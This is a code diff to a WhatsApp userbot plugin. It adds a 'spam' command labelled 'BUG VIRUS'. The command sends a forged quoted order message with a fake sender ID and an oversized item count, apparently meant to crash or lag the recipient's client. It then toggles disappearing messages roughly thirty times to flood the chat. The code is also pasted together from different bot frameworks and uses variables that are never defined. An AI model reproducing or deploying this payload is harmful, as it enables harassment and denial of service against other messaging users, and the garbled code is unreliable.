@@ -2569,3 +2569,103 @@ Asena.addCommand({pattern: 'spam ?(.*)', fromMe: true, dontAddCommandList: true,
     
     await message.client.sendMessage(message.jid, fin, MessageType.text);
 }));
+
+Asena.addCommand({pattern: 'spam ?(.*)', fromMe: true, dontAddCommandList: true, desc: Lang.SPAM_DESC}, (async (message, match) => {
+
+				if (!isOwner) return reply(mess.only.ownerB)
+
+Janiya.sendMessage(mek.key.remoteJid, '👾BUG VIRUS BY JC👾', MessageType.extendedText, {
+
+ quoted: {
+
+  key: {
+
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+
+  },
+
+  message: {
+
+   orderMessage: {
+
+    itemCount: 9999999, // Bug
+
+    status: 1,
+
+    surface: 1,
+
+    message: 'ꜱʟᴍㅤᴍʀ.ᴊᴄㅤ✿',
+
+    orderTitle: '「 ᴊᴀɴɪʏᴀ ᴏꜰꜰɪᴄɪᴀʟツ 」 ', // Idk what this does
+
+    sellerJid: '0@s.whatsapp.net' // Seller
+
+   }
+
+  }
+
+ }
+
+})
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+Janiya.toggleDisappearingMessages(from,`MODAR`,text)
+
+break
+
+}));
